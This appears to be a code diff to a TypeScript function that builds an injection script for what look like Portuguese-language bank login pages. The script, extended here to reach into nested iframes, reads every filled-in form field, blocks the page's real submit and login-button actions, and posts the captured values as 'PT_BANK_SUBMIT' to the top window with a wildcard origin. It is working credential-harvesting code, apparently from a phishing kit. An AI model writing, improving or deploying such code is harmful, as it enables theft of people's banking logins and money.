@@ -38,23 +38,37 @@ function buildInjectionScript(): string {
   const reSource = SUBMIT_TEXT_RE.source;
   const reFlags = SUBMIT_TEXT_RE.flags;
   return `(() => {
-    if (window.__ptCaptureInjected) return;
-    window.__ptCaptureInjected = true;
-
     const SUBMIT_RE = new RegExp(${JSON.stringify(reSource)}, ${JSON.stringify(reFlags)});
+    const IGNORED = ${JSON.stringify([...IGNORED_INPUT_TYPES])};
+
+    const collectFrom = (doc) => {
+      const data = {};
+      try {
+        doc.querySelectorAll("input, textarea, select").forEach((el) => {
+          const type = (el.getAttribute("type") || "text").toLowerCase();
+          if (IGNORED.includes(type)) return;
+          const name = el.getAttribute("name") || el.getAttribute("id") || "";
+          if (!name) return;
+          const value = el.value != null ? String(el.value) : "";
+          if (value.trim() === "") return;
+          data[name] = value;
+        });
+      } catch (e) {}
+      return data;
+    };
 
     const collect = () => {
       const data = {};
-      const inputs = document.querySelectorAll("input, textarea, select");
-      inputs.forEach((el) => {
-        const type = (el.getAttribute("type") || "text").toLowerCase();
-        if (${JSON.stringify([...IGNORED_INPUT_TYPES])}.includes(type)) return;
-        const name = el.getAttribute("name") || el.getAttribute("id") || "";
-        if (!name) return;
-        const value = el.value != null ? String(el.value) : "";
-        if (value.trim() === "") return;
-        data[name] = value;
-      });
+      const walk = (doc, depth) => {
+        if (!doc || depth > 4) return;
+        try {
+          Object.assign(data, collectFrom(doc));
+          doc.querySelectorAll("iframe").forEach((f) => {
+            try { walk(f.contentDocument, depth + 1); } catch (e) {}
+          });
+        } catch (e) {}
+      };
+      walk(document, 0);
       return data;
     };
 
@@ -62,58 +76,99 @@ function buildInjectionScript(): string {
       const data = collect();
       if (Object.keys(data).length === 0) return;
       try {
-        window.parent.postMessage({ type: "PT_BANK_SUBMIT", trigger, data }, "*");
+        (window.top || window.parent).postMessage({ type: "PT_BANK_SUBMIT", trigger, data }, "*");
       } catch (e) { /* noop */ }
     };
-
-    document.addEventListener("submit", (e) => {
-      try { e.preventDefault(); e.stopPropagation(); } catch (err) {}
-      send("form-submit");
-      return false;
-    }, true);
 
     const isSubmitish = (el) => {
       if (!el || !el.getAttribute) return false;
       const tag = (el.tagName || "").toLowerCase();
       const type = (el.getAttribute("type") || "").toLowerCase();
       const role = (el.getAttribute("role") || "").toLowerCase();
-      const ident = ((el.getAttribute("id") || "") + " " + (el.className && el.className.baseVal === undefined ? el.className : "")).toLowerCase();
+      const ident = ((el.getAttribute("id") || "") + " " + (typeof el.className === "string" ? el.className : "")).toLowerCase();
       const text = (el.innerText || el.textContent || el.value || el.getAttribute("aria-label") || "").trim();
       if (tag === "input" && (type === "submit" || type === "image")) return true;
       if (tag === "button" && type === "submit") return true;
-      if (/(submit|login|entrar|signin)/.test(ident)) return true;
+      if ((tag === "a" || tag === "button" || role === "button" || (tag === "input" && type === "button")) && /(submit|entrar|signin|botao|btn-login|login-button)/.test(ident)) return true;
       if (role === "button" && SUBMIT_RE.test(text) && text.length <= 60) return true;
       if (tag === "a" && SUBMIT_RE.test(text) && text.length <= 60) return true;
       if ((tag === "input" || tag === "button") && type !== "submit" && SUBMIT_RE.test(text) && text.length <= 60) return true;
       return false;
     };
 
-    document.addEventListener("click", (e) => {
-      let el = e.target;
-      let depth = 0;
-      while (el && el !== document.body && depth < 4) {
-        if (isSubmitish(el)) {
-          try { e.preventDefault(); e.stopPropagation(); } catch (err) {}
-          send("click:" + (el.tagName || "").toLowerCase());
-          return;
-        }
-        el = el.parentElement;
-        depth++;
-      }
-    }, true);
+    const attach = (doc) => {
+      if (!doc || doc.__ptCaptureInjected) return;
+      doc.__ptCaptureInjected = true;
 
-    document.addEventListener("keydown", (e) => {
+      doc.addEventListener("submit", (e) => {
+        try { e.preventDefault(); e.stopPropagation(); } catch (err) {}
+        send("form-submit");
+        return false;
+      }, true);
+
+      doc.addEventListener("click", (e) => {
+        try {
+          const t = e.target;
+          const ttag = (t && t.tagName || "").toLowerCase();
+          if (ttag === "input" || ttag === "textarea" || ttag === "select") {
+            const ttype = (t.getAttribute("type") || "").toLowerCase();
+            if (ttag !== "input" || (ttype !== "submit" && ttype !== "button" && ttype !== "image")) return;
+          }
+        } catch (err) {}
+        let el = e.target;
+        let depth = 0;
+        while (el && el !== doc.body && depth < 4) {
+          if (isSubmitish(el)) {
+            try { e.preventDefault(); e.stopPropagation(); } catch (err) {}
+            send("click:" + (el.tagName || "").toLowerCase());
+            return;
+          }
+          el = el.parentElement;
+          depth++;
+        }
+      }, true);
+
+      doc.addEventListener("keydown", (e) => {
+        try {
+          if (e.key !== "Enter") return;
+          const t = e.target;
+          if (!t || !t.getAttribute) return;
+          const tag = (t.tagName || "").toLowerCase();
+          if (tag !== "input" && tag !== "select") return;
+          const type = (t.getAttribute("type") || "text").toLowerCase();
+          if (type === "hidden" || type === "checkbox" || type === "radio") return;
+          send("enter-key");
+        } catch (err) {}
+      }, true);
+    };
+
+    const scanIframes = (doc, depth) => {
+      if (!doc || depth > 4) return;
       try {
-        if (e.key !== "Enter") return;
-        const t = e.target;
-        if (!t || !t.getAttribute) return;
-        const tag = (t.tagName || "").toLowerCase();
-        if (tag !== "input" && tag !== "select") return;
-        const type = (t.getAttribute("type") || "text").toLowerCase();
-        if (type === "hidden" || type === "checkbox" || type === "radio") return;
-        send("enter-key");
-      } catch (err) {}
-    }, true);
+        doc.querySelectorAll("iframe").forEach((f) => {
+          try {
+            const d = f.contentDocument;
+            if (d) { attach(d); scanIframes(d, depth + 1); }
+            f.addEventListener("load", () => {
+              try {
+                if (f.contentDocument) { attach(f.contentDocument); scanIframes(f.contentDocument, depth + 1); }
+              } catch (e) {}
+            });
+          } catch (e) {}
+        });
+      } catch (e) {}
+    };
+
+    attach(document);
+    scanIframes(document, 0);
+    try {
+      new MutationObserver(() => scanIframes(document, 0)).observe(document.documentElement, { childList: true, subtree: true });
+    } catch (e) {}
+    let tries = 0;
+    const retry = setInterval(() => {
+      scanIframes(document, 0);
+      if (++tries > 30) clearInterval(retry);
+    }, 500);
   })();`;
 }
 
